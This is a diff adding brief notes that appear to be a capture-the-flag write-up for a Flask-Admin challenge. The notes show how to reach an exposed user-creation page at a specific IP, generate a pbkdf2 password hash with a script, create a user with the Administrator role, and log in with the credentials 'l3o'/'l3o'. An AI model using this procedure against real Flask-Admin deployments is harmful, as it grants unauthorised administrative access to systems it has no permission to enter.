@@ -1,0 +1,20 @@
+https://telegra.ph/flask-admin-writeups-03-28
+
+http://172.105.84.156:5000/admin/user/new
+
+
+Create Password Hash
+python3 create_hash.py
+	pbkdf2:sha256:150000$AhJjX5LW$411a8b251fa8cacb12e0c0f428c07cf0a18a5e29783ea485a01a449bb60fa014
+
+
+Fill the form
+	Email: l3o@mail
+	Username: l3o
+	Password Hash: pbkdf2:sha256:150000$AhJjX5LW$411a8b251fa8cacb12e0c0f428c07cf0a18a5e29783ea485a01a449bb60fa014
+	Role: <Role 'Administrator'>
+
+
+http://172.105.84.156:5000/login
+	l3o
+	l3o
